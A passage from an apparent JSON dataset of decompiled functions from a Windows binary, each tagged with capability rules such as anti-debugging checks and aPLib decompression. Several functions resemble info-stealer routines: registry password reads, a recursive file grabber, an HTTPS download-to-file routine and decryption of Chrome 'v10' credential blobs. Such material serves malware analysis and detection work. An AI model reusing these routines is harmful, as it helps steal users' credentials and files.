arg_8h;\n    }\n    *(var_4h + param_3 * 2) = 0;\n    *in_FS_OFFSET = piStack16;\n    return puVar3;\n}\n",
        "token_count": 884
    },
    "004218f0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004218f0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    \n    iVar1 = *param_1;\n    uVar3 = (param_1[1] - iVar1) / 0x1c;\n    if (0x9249248 < uVar3) {\n        fcn.0042cb30(\"vector<T> too long\");\n        param_1 = extraout_ECX;\n    }\n    uVar2 = (param_1[2] - iVar1) / 0x1c;\n    uVar3 = uVar3 + 1;\n    if (uVar2 < uVar3) {\n        if (0x9249249 - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.00421970(uVar2);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00423b70": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423b70(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uchar *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uVar2 = arg_1ch;\n    uStack12 = 0x441528;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    puVar4 = arg_8h;\n    if (arg_1ch < 0x10) {\n        puVar4 = &arg_8h;\n    }\n    pcVar6 = puVar4 + 1;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar5 = puVar4 - pcVar6;\n    if (uVar5 % 3 != 0) {\n        uVar5 = (uVar5 - uVar5 % 3) + 3;\n    }\n    pcVar6 = fcn.0042d6d0((uVar5 * 8) / 6 + 1);\n    puVar4 = arg_8h;\n    if (uVar2 < 0x10) {\n        puVar4 = &arg_8h;\n    }\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00423aa0(uVar3);\n    *(unaff_EDI + 0x14) = 0xf;\n    *(unaff_EDI + 0x10) = 0;\n    *unaff_EDI = 0;\n    pcVar7 = pcVar6;\n    do {\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(pcVar6, pcVar7 - (pcVar6 + 1));\n    if (0xf < arg_1ch) {\n        fcn.0042d62b(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 614
    },
    "00429800": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00429800(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    int32_t in_EAX;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *(param_1 + 0x1f2c + *(param_1 + 0x1af2c)) = param_2;\n    *(param_1 + 0x1af2c) = *(param_1 + 0x1af2c) + 1;\n    if (in_EAX == 0) {\n        piVar1 = param_1 + 0x14 + param_2 * 4;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        piVar1 = param_1 + 0x418 + *(param_1 + 0x1b3d + param_2) * 4;\n        *piVar1 = *piVar1 + 1;\n        iVar5 = in_EAX + -1;\n        if (iVar5 < 0x100) {\n            uVar2 = *(param_1 + 0x1c3d + iVar5);\n        }\n        else {\n            uVar2 = *((iVar5 >> 7) + 0x1d3d + param_1);\n        }\n        piVar1 = param_1 + 0x908 + uVar2 * 4;\n        *piVar1 = *piVar1 + 1;\n        *(param_1 + 0x9f2c + *(param_1 + 0x1af30) * 2) = iVar5;\n        *(param_1 + 0x1af30) = *(param_1 + 0x1af30) + 1;\n        *(param_1 + 0x1af38) = *(param_1 + 0x1af38) | *(param_1 + 0x1af39);\n    }\n    *(param_1 + 0x1af39) = *(param_1 + 0x1af39) << 1;\n    if ((*(param_1 + 0x1af2c) & 7) == 0) {\n        *(*(param_1 + 0x1af34) + 0x19f2c + param_1) = *(param_1 + 0x1af38);\n        *(param_1 + 0x1af34) = *(param_1 + 0x1af34) + 1;\n        *(param_1 + 0x1af38) = 0x100;\n    }\n    if ((2 < *(param_1 + 4)) && ((*(param_1 + 0x1af2c) & 0xfff) == 0)) {\n        iVar5 = *(param_1 + 0x1af2c) * 8;\n        var_8h = 0;\n        var_4h = 0;\n        piVar3 = 0x44c9ac;\n        puVar4 = param_1 + 0x90c;\n        do {\n            iVar5 = iVar5 + puVar4[-2] * (piVar3[-1] + 5);\n            var_4h = var_4h + (*piVar3 + 5) * *puVar4;\n            var_8h = var_8h + puVar4[2] * (piVar3[1] + 5);\n            piVar3 = piVar3 + 3;\n            puVar4 = puVar4 + 6;\n        } while (piVar3 < 0x44ca24);\n        if ((*(param_1 + 0x1af30) < *(param_1 + 0x1af2c) >> 1) &&\n           ((iVar5 + var_4h + var_8h >> 2 & 0x3ffffffe) < (*(param_1 + 0x6af84) - *(param_1 + 0x6af74) & 0xfffffffeU)))\n        {\n            return 1;\n        }\n    }\n    if ((*(param_1 + 0x1af2c) != 0x7fff) && (*(param_1 + 0x1af30) != 0x8000)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1013
    },
    "00404f00": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404f00(uint arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint uVar7;\n    int32_t *in_ECX;\n    uint32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_c84h;\n    uint var_c80h;\n    uint var_c7ch;\n    uint var_c78h;\n    uint var_c74h;\n    int32_t var_c70h;\n    uint var_c6ch;\n    int32_t var_c68h;\n    int32_t var_c64h;\n    uint32_t *var_c60h;\n    int32_t var_c5ch;\n    uint32_t var_c58h;\n    uint var_c48h;\n    uint32_t var_c44h;\n    uint32_t var_c3ch;\n    uint var_c2ch;\n    uint32_t var_c28h;\n    int32_t var_c20h;\n    int32_t var_c1ch;\n    uint var_c14h;\n    uint var_814h;\n    int32_t var_414h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x442077;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_c6ch = 0x80000001;\n    *in_EDX = 0;\n    in_EDX[1] = 0;\n    in_EDX[2] = 0;\n    arg_8h_00 = &var_c6ch;\n    var_4h = 0;\n    *in_ECX = 0;\n    var_c60h = in_EDX;\n    iVar5 = (**0x457448)(0x80000001, arg_8h, 0, 0x20019, arg_8h_00, var_14h);\n    if (iVar5 == 0) {\n        var_c68h = 0;\n        var_c74h = 0xff;\n        var_c70h = 3;\n        var_814h._0_1_ = 0;\n        iVar5 = (**0x4575c0)(var_c6ch, 0, &var_814h, &var_c74h, 0, &var_c70h, &var_414h, &var_c64h);\n        while (iVar5 == 0) {\n            var_c44h = 0xf;\n            var_c48h = 0;\n            var_c58h = var_c58h & 0xffffff00;\n            var_c28h = 0xf;\n            var_c2ch = 0;\n            var_c3ch = var_c3ch & 0xffffff00;\n            puVar6 = &var_814h;\n            var_4h = 1;\n            do {\n                cVar1 = *puVar6;\n                puVar6 = puVar6 + 1;\n            } while (cVar1 != '\\0');\n            fcn.004090e0(&var_814h, puVar6 - (&var_814h + 1));\n            var_c5ch = var_c70h;\n            var_c20h = var_c64h;\n            if (var_c70h == 3) {\n                iVar5 = (**0x4573a0)(&var_814h, \"Password\");\n                if (iVar5 == 0) {\n                    fcn.00409730(0x44c734, &var_414h);\n                    puVar6 = &var_414h;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.004090e0(&var_414h, puVar6 - (&var_414h + 1));\n                }\n                else {\n                    uVar7 = fcn.00404e80(&var_414h, var_c64h);\n                    fcn.0042dd9f(&var_c14h, 0x400, uVar7);\n                    uVar7 = (**0x45757c)(0, uVar7);\n                    (**0x4575a8)(uVar7);\n                    puVar6 = &var_c14h;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.004090e0(&var_c14h, puVar6 - (&var_c14h + 1));\n                    fcn.0042dd9f(&var_c14h, 0x400, 0x44c726);\n                }\n            }\n            else if (var_c70h == 1) {\n                puVar6 = &var_414h;\n                do {\n                    cVar1 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (cVar1 != '\\0');\n                fcn.004090e0(&var_414h, puVar6 - (&var_414h + 1));\n            }\n            else if (var_c70h == 4) {\n                var_c1ch = var_414h;\n            }\n            *in_ECX = *in_ECX + 1;\n            puVar6 = in_EDX[1];\n            if (&var_c5ch < puVar6) {\n                puVar2 = *in_EDX;\n                if (&var_c5ch < puVar2) goto code_r0x0040526c;\n                if (puVar6 == var_c60h[2]) {\n                    fcn.00409070();\n                }\n                puVar3 = var_c60h[1];\n                puVar6 = *var_c60h + ((&var_c5ch - puVar2) / 0x44) * 0x44;\n                var_4h._0_1_ = 2;\n                if (puVar3 != NULL) {\n                    *puVar3 = *puVar6;\n                    puVar3[6] = 0xf;\n                    puVar3[5] = 0;\n                    *(puVar3 + 1) = 0;\n                    fcn.004092e0(puVar6 + 1, 0, 0xffffffff);\n                    var_4h._0_1_ = 3;\n                    puVar3[0xd] = 0xf;\n                    puVar3[0xc] = 0;\n                    *(puVar3 + 8) = 0;\n                    fcn.004092e0(puVar6 + 8, 0, 0xffffffff);\n                    puVar3[0xf] = puVar6[0xf];\n                    puVar3[0x10] = puVar6[0x10];\n                }\n                var_c60h[1] = var_c60h[1] + 0x44;\n            }\n            else {\ncode_r0x0040526c:\n                if (puVar6 == in_EDX[2]) {\n                    fcn.00409070();\n                }\n                piVar4 = in_EDX[1];\n                var_4h._0_1_ = 4;\n                if (piVar4 != NULL) {\n                    *piVar4 = var_c5ch;\n                    piVar4[6] = 0xf;\n                    piVar4[5] = 0;\n                    *(piVar4 + 1) = 0;\n                    fcn.004092e0(&var_c58h, 0, 0xffffffff);\n                    var_4h._0_1_ = 5;\n                    piVar4[0xd] = 0xf;\n                    piVar4[0xc] = 0;\n                    *(piVar4 + 8) = 0;\n                    fcn.004092e0(&var_c3ch, 0, 0xffffffff);\n                    piVar4[0xf] = var_c20h;\n                    piVar4[0x10] = var_c1ch;\n                }\n                var_c60h[1] = var_c60h[1] + 0x44;\n            }\n            var_c68h = var_c68h + 1;\n            var_4h = var_4h._1_3_ << 8;\n            var_c74h = 0x400;\n            var_c64h = 0x400;\n            if (0xf < var_c28h) {\n                fcn.0042d62b(var_c3ch);\n            }\n            var_c28h = 0xf;\n            var_c2ch = 0;\n            var_c3ch = var_c3ch & 0xffffff00;\n            if (0xf < var_c44h) {\n                fcn.0042d62b(var_c58h);\n            }\n            var_c44h = 0xf;\n            var_c48h = 0;\n            var_c58h = var_c58h & 0xffffff00;\n            iVar5 = (**0x4575c0)(var_c6ch, var_c68h, &var_814h, &var_c74h, 0, &var_c70h, &var_414h, &var_c64h);\n            in_EDX = var_c60h;\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 2146
    },
    "0040e640": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e640(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    if (3 < in_EAX) {\n        do {\n            if (*param_2 != *param_1) goto code_r0x0040e668;\n            in_EAX = in_EAX - 4;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n        } while (3 < in_EAX);\n    }\n    if (in_EAX == 0) {\n        return 0;\n    }\ncode_r0x0040e668:\n    iVar1 = *param_2 - *param_1;\n    if (iVar1 == 0) {\n        if (in_EAX < 2) {\n            return 0;\n        }\n        iVar1 = *(param_2 + 1) - *(param_1 + 1);\n        if (iVar1 == 0) {\n            if (in_EAX < 3) {\n                return 0;\n            }\n            iVar1 = *(param_2 + 2) - *(param_1 + 2);\n            if (iVar1 == 0) {\n                if (in_EAX < 4) {\n                    return 0;\n                }\n                iVar1 = *(param_2 + 3) - *(param_1 + 3);\n            }\n        }\n    }\n    return iVar1 >> 0x1f | 1;\n}\n",
        "token_count": 338
    },
    "0040ffa0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040ffa0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, int32_t noname_4, uint32_t noname_5, \n            uint noname_6, int32_t noname_7, int32_t noname_8, uint noname_9, uint32_t noname_10, uint32_t noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, \n            uint noname_24, uint noname_25, uint noname_26, uint noname_27, uint arg_8h, uint arg_ch, uint arg_10h, \n            uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h, uint arg_28h, uint arg_2ch, \n            uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uchar *puVar6;\n    ulong uVar7;\n    uint unaff_retaddr;\n    uint var_4h;\n    uchar auStack8156 [4];\n    uchar *puStack8152;\n    int32_t iStack8148;\n    uint uStack8144;\n    uint uStack8140;\n    int32_t iStack8136;\n    uint uStack8132;\n    uint uStack8128;\n    uchar auStack8124 [44];\n    uchar auStack8080 [32];\n    uint var_1fdch;\n    uint var_1fd8h;\n    uint var_1fd4h;\n    uint var_1fd0h;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1f8ch;\n    uchar auStack7804 [112];\n    uint var_1e78h;\n    uchar auStack2804 [112];\n    uint var_af0h;\n    uchar auStack1804 [112];\n    uint var_708h;\n    uint auStack1540 [28];\n    uint var_600h;\n    uint var_218h_2;\n    uint var_218h;\n    uint auStack276 [28];\n    uint var_110h;\n    uint uStack84;\n    uint *noname_3_00;\n    uint uVar8;\n    uint *puVar9;\n    uint uVar10;\n    uint uVar11;\n    uchar *noname_14_00;\n    uchar *noname_15_00;\n    \n    fcn.0043c480();\n    uStack8128 = noname_0;\n    uStack8144 = noname_1;\n    uStack8140 = noname_2;\n    uStack8132 = noname_3;\n    (**0x457374)();\n    noname_15_00 = &stack0xffffe044;\n    noname_14_00 = &stack0xfffff8f4;\n    iStack8148 = (**0x4575e0)();\n    fcn.00434d30();\n    puVar6 = &stack0xffffe184;\n    uVar8 = noname_6;\n    (**0x457520)();\n    uVar7 = CONCAT44(uVar8, puVar6);\n    iStack8136 = 0;\n    if (iStack8148 != -1) {\n        do {\n            iVar2 = (**0x457550)();\n            if (((iVar2 != 0) && (iVar2 = (**0x457550)(),  iVar2 != 0)) &&\n               (iVar2 = fcn.0040fe40(0x80000000),  iVar2 != 0)) {\n                puVar9 = &fcn.0040ffa0::var_218h_2;\n                (**0x4575cc)();\n                uVar8 = 0x44c8cc;\n                noname_3_00 = &fcn.0040ffa0::var_218h_2;\n                (**0x457520)();\n                puVar6 = &stack0xffffe070;\n                (**0x457520)();\n                uVar11 = uVar7 >> 0x20;\n                if (noname_8 == 0) {\n                    puStack8152 = &stack0xffffffcc;\n                    puVar3 = &fcn.0040ffa0::var_218h_2;\n                    uVar10 = 0xf;\n                    uVar5 = puVar6 & 0xffffff00;\n                    do {\n                        cVar1 = *puVar3;\n                        puVar3 = puVar3 + 1;\n                    } while (cVar1 != '\\0');\n                    iVar2 = puVar3 - (&fcn.0040ffa0::var_218h_2 + 1);\n                    puVar3 = &fcn.0040ffa0::var_218h_2;\n                    fcn.004090e0(puVar3, iVar2);\n                    iVar2 = fcn.0040fa30(puVar3, iVar2, uVar5, noname_3_00, uVar8, puVar9);\n                    uVar7 = CONCAT44(uVar11, uVar10);\n                    if (iVar2 != 0) goto code_r0x00410572;\n                }\n                fcn.00434d30();\n                fcn.00434d30();\n                iVar2 = (**0x457550)();\n                if (iVar2 == 0) {\n                    (**0x457374)();\n                }\n                else {\n                    (**0x457374)();\n                }\n                iVar2 = (**0x457418)();\n                if (iVar2 < 4) {\n                    if ((noname_8 == 0) || (iVar2 = (**0x45741c)(),  iVar2 == 0)) {\n                        iVar2 = (**0x45741c)();\n                        if (iVar2 != 0) {\n                            (**0x4575cc)();\n                            (**0x457520)();\n                            (**0x457520)();\n                            uVar7 = fcn.004245a0();\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar5 = fcn.00436c90();\n                            if (uVar5 < noname_5) {\n                                if (*0x4572e8 <= *0x4572f4) goto code_r0x0041059b;\n                                iVar2 = fcn.0040fe40(0xc0000000);\n                                if (iVar2 != 0) {\n                                    if (noname_7 == 0) {\n                                        puVar9 = &stack0xfffffeec;\n                                    }\n                                    else {\n                                        puVar9 = &fcn.0040ffa0::var_218h_2;\n                                    }\n                                    fcn.0042ca20(puVar9);\n                                    *0x4572f4 = *0x4572f4 + uVar5;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        (**0x457544)();\n                        puVar6 = &stack0xfffff9fc;\n                        fcn.0040f900();\n                        (**0x457528)();\n                        iVar2 = (**0x45741c)();\n                        if (iVar2 != 0) {\n                            (**0x4575cc)();\n                            (**0x457520)();\n                            (**0x4573dc)();\n                            (**0x457520)();\n                            uVar7 = fcn.004245a0();\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar5 = fcn.00436c90();\n                            if (uVar5 < noname_5) {\n                                if (*0x4572e8 <= *0x4572f4) goto code_r0x0041059b;\n                                iVar2 = fcn.0040fe40(0xc0000000);\n                                if (iVar2 != 0) {\n                                    if (noname_7 == 0) {\n                                        puVar6 = &stack0xfffffeec;\n                                    }\n                                    fcn.0042ca20(puVar6);\n                                    *0x4572f4 = *0x4572f4 + uVar5;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.0042e17e(&stack0xffffe184, 0x44ebe0, &stack0xffffe024);\n                    iStack8136 = 0;\n                    puVar6 = NULL;\n                    if ((noname_8 != 0) && (iVar4 = (**0x45741c)(),  iVar4 != 0)) {\n                        puStack8152 = 0x1;\n                        (**0x457544)();\n                        fcn.0040f900();\n                        (**0x457528)();\n                        puVar6 = puStack8152;\n                    }\n                    if (iVar2 != 0) {\n                        do {\n                            iVar2 = (**0x457490)();\n                            if (iVar2 != 0) {\n                                iStack8136 = 1;\n                            }\n                            iVar2 = fcn.0042e17e(0, 0x44ebe0, &stack0xffffe024);\n                        } while (iVar2 != 0);\n                        if (iStack8136 != 0) goto code_r0x00410519;\n                    }\n                    if (puVar6 == NULL) {\n                        iVar2 = (**0x45741c)();\n                        if (iVar2 != 0) {\n                            (**0x4575cc)();\n                            (**0x457520)();\n                            (**0x457520)();\n                            uVar7 = fcn.004245a0();\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar5 = fcn.00436c90();\n                            if (uVar5 < noname_5) {\n                                if (*0x4572e8 <= *0x4572f4) goto code_r0x0041059b;\n                                iVar2 = fcn.0040fe40(0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar9 = &fcn.0040ffa0::var_218h_2;\n                                    goto joined_r0x004103e8;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        iVar2 = (**0x45741c)();\n                        if (iVar2 != 0) {\n                            (**0x4575cc)();\n                            (**0x457520)();\n                            (**0x4573dc)();\n                            (**0x457520)();\n                            uVar7 = fcn.004245a0();\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar5 = fcn.00436c90();\n                            if (uVar5 < noname_5) {\n                                if (*0x4572e8 <= *0x4572f4) goto code_r0x0041059b;\n                                iVar2 = fcn.0040fe40(0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar9 = &stack0xfffff9fc;\njoined_r0x004103e8:\n                                    if (noname_7 == 0) {\n                                        puVar9 = &stack0xfffffeec;\n                                    }\n                                    fcn.0042ca20(puVar9);\n                                    *0x4572f4 = *0x4572f4 + uVar5;\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x00410519:\n                if (noname_4 != 0) {\n                    if (noname_10 < noname_11) break;\n                    if (iStack8136 == 0) {\n                        uStack84 = 0x41056f;\n                        fcn.0040ffa0(uStack8128, &stack0xfffff50c, &fcn.0040ffa0::var_218h_2, uStack8132, noname_4, \n                                     noname_5, noname_6, noname_7, noname_8, noname_9, noname_10, noname_11 + 1, uVar7, \n                                     uVar7 >> 0x20, noname_14_00, noname_15_00, unaff_EDI, unaff_ESI, unaff_EBX, \n                                     unaff_EBP, unaff_retaddr, noname_0, noname_1, noname_2, noname_3, noname_4, \n                                     noname_5, noname_6, noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, \n                                     noname_13, noname_14, noname_15, noname_16, noname_17, noname_18);\n                    }\n                }\n            }\ncode_r0x00410572:\n            iVar2 = (**0x457438)();\n        } while (iVar2 != 0);\n        (**0x4573a8)();\n    }\ncode_r0x0041059b:\n    fcn.0042d636(noname_15_00);\n    return;\n}\n",
        "token_count": 3026
    },
    "004175c0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004175c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint32_t var_51ch;\n    uint var_518h;\n    uint var_514h;\n    uint var_510h;\n    int32_t var_50ch;\n    uint32_t var_508h;\n    uint var_504h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_518h = arg_8h;\n    var_510h = 0;\n    var_514h = 0x100;\n    iVar1 = (**0x45745c)(0x44c726, 1, 0, 0, 0);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00417540(\"https\");\n        iVar3 = (**0x457550)(uVar2);\n        if (iVar3 == 0) {\n            var_510h = 1;\n        }\n        var_50ch = 0;\n        do {\n            uVar2 = (**0x457460)(iVar1);\n            iVar3 = (**0x4575d4)(uVar2, 0x13, &var_104h, &var_514h, 0);\n            if (iVar3 != 0) {\n                iVar3 = (**0x457550)(&var_104h, 0x44ee60);\n                if (iVar3 == 0) break;\n                (**0x457390)(1000);\n            }\n            var_50ch = var_50ch + 1;\n        } while (var_50ch < 3);\n        uVar4 = (**0x4573b4)(var_518h, 0x40000000, 3, 0, 2, 0x80, 0);\n        iVar3 = (**0x457480)(uVar2, &var_504h, 0x400, &var_508h);\n        while ((iVar3 != 0 &&\n               (((var_508h == 0 ||\n                 ((iVar3 = (**0x457420)(uVar4, &var_504h, var_508h, &var_51ch, 0),  iVar3 != 0 && (var_508h == var_51ch)\n                  ))) && (0x3ff < var_508h))))) {\n            iVar3 = (**0x457480)(uVar2, &var_504h, 0x400, &var_508h);\n        }\n        fcn.00434d30(&var_504h, 0, 0x400);\n        (**0x4573b8)(uVar4);\n        (**0x457458)(uVar2);\n        (**0x457458)(iVar1);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 688
    },
    "00418cb0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418cb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *arg_8h_00;\n    char *in_ECX;\n    char *pcVar3;\n    uint32_t in_EDX;\n    uchar *unaff_EBX;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_78h;\n    uint var_74h;\n    char *var_70h;\n    int32_t var_6ch;\n    char *var_60h;\n    uint var_5ch;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441558;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = arg_ch;\n    var_30h = 0;\n    if ((((in_EDX < 3) || (*in_ECX != 'v')) || (in_ECX[1] != '1')) || (in_ECX[2] != '0')) {\n        arg_8h_00 = fcn.00418c40(var_10h);\n        *(unaff_EBX + 0x14) = 0xf;\n        *(unaff_EBX + 0x10) = 0;\n        *unaff_EBX = 0;\n        pcVar3 = arg_8h_00;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        fcn.004090e0(arg_8h_00, pcVar3 - (arg_8h_00 + 1));\n    }\n    else {\n        if ((arg_8h != 0) && (arg_ch != 0)) {\n            fcn.00434d30(&var_78h, 0, 0x40);\n            var_70h = in_ECX + 3;\n            var_60h = var_70h + (in_EDX - 0x13);\n            var_30h = in_EDX - 0x1f;\n            var_78h = 0x40;\n            var_74h = 1;\n            var_6ch = 0xc;\n            var_5ch = 0x10;\n            iVar2 = (**0x4574c8)(0x40, var_30h);\n            if (iVar2 != 0) {\n                iVar2 = (**0x457568)(var_34h, var_70h + var_6ch, var_30h, &var_78h, 0, 0, iVar2, var_30h, &var_30h, 0);\n                if (-1 < iVar2) {\n                    fcn.00420060();\n                    var_4h = 0;\n                    fcn.00408f60();\n                    fcn.00408f80();\n                    goto code_r0x00418e02;\n                }\n            }\n        }\n        fcn.00408f20(\"NULL\");\n    }\ncode_r0x00418e02:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EDI);\n    return;\n}\n",
        "token_count": 794
    },
    "0041e150": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e150(uint arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 3) {\n        fcn.0041dc20(arg_8h, 1, 3, 0, 0, 1);\n        return;\n    }\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 0, 0, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 0, 1, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 1, 1);\n    fcn.0041dc20(arg_8h, 